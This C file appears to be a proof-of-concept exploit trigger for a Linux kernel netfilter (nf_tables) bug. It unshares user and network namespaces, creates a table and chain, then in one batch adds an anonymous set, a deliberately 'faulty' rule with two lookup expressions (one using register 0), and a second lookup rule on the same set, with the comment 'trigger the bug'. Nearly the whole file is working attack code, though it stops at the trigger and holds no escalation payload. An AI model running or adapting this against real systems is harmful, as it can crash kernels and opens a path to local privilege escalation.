#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>

#define mnl_batch_limit (1024 * 1024)
char mnl_batch_buffer[2 * mnl_batch_limit];


uint32_t family = NFPROTO_INET;
char *table_name = "table";
char *table_name_2 = "table2";

char *chain_name = "chain";
char *chain_name_2 = "chain2";

char *set_name = "set";
char *set_name_2 = "set2";

static void create_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char * table_name)
{
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL) {
        errx(1, "Cannot into nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nftnl_table_free(table);
}

static void create_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *chain_name)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL) {
        errx(1, "Cannot into nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}

static void create_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *set_name, uint32_t set_id, uint32_t set_flags)
{
    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL) {
        errx(1, "Cannot into nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 1);

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSET,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_set_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_set_free(set);
}

static void create_lookup_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *chain_name, char *set_name, int set_id)
{
    struct nftnl_rule *rule = nftnl_rule_alloc();
    if (rule == NULL) {
        errx(1, "Cannot into nftnl_rule_alloc()");
    }

    nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

    struct nftnl_expr *lookup = nftnl_expr_alloc("lookup");
    if (lookup == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
    nftnl_expr_set_str(lookup, NFTNL_EXPR_LOOKUP_SET, set_name);
    nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
    nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_FLAGS, 0);

    nftnl_rule_add_expr(rule, lookup);

    struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE,
        family,
        NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_rule_free(rule);
}

static void create_fault_lookup_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *chain_name, char *set_name, int set_id) {
    
    struct nftnl_expr *lookup1, *lookup2;
    struct nftnl_rule *rule;

    rule = nftnl_rule_alloc();
    if (rule == NULL) {
        errx(1, "Cannot into nftnl_rule_alloc()");
    }

    nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

    lookup1 = nftnl_expr_alloc("lookup");
    if (lookup1 == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    // for release
    nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
    nftnl_expr_set_str(lookup1, NFTNL_EXPR_LOOKUP_SET, set_name);
    nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
    nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_FLAGS, 0);

    nftnl_rule_add_expr(rule, lookup1);

    lookup2 = nftnl_expr_alloc("lookup");
    if (lookup2 == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    // for fault
    nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_SREG, 0);
    nftnl_expr_set_str(lookup2, NFTNL_EXPR_LOOKUP_SET, set_name);
    nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
    nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_FLAGS, 0);

    nftnl_rule_add_expr(rule, lookup2);

    struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE,
        family,
        NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_rule_free(rule);
} // create_fault_lookup_rule

static void prepare(struct mnl_socket* nl) {
    uint32_t portid, seq, table_seq;
    int ret;

    seq = time(NULL);

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);


    create_table(batch, seq++, table_name);
    create_chain(batch, seq++, table_name, chain_name);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "Cannot into mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);
    while (table_seq + 1 != seq) {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret == -1) {
            err(1, "Cannot into mnl_socket_recvfrom()");
        }
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret == -1) {
            err(1, "Cannot into mnl_cb_run()");
        }
        table_seq++;
    }
} // prepare()

static void trigger(struct mnl_socket *nl) {
    uint32_t portid, seq, table_seq;
    int ret;
    seq = time(NULL);

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    printf("[*] create an anonymous set...\n");
    create_set(batch, seq++, table_name, set_name, 0x13101, NFT_SET_ANONYMOUS);
    printf("[*] Done for creating an anonymous...\n");

    printf("[*] create a faulty lookup rule...\n");
    create_fault_lookup_rule(batch, seq++, table_name, chain_name, set_name, 0x13101);
    printf("[*] Done for creating a faulty lookup rule...\n");


    printf("[*] create a lookup rule...\n");
    create_lookup_rule(batch, seq++, table_name, chain_name, set_name, 0x13101);
    printf("[*] Done for creating a lookup rule...\n");


    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    sleep(1);
    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "Cannot into mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);
} // trigger()

int main() {

  // Set namespace
  unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
  
  struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
  if (nl == NULL) {
    perror("mnl_socket_open");
    return -1;
  }

  if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
    perror("mnl_socket_bind");
    return -1;
  }

  // set up the table and the chain
  prepare(nl);
	
  sleep(2);

  // trigger the bug
  trigger(nl);


  return 0;
} // main()
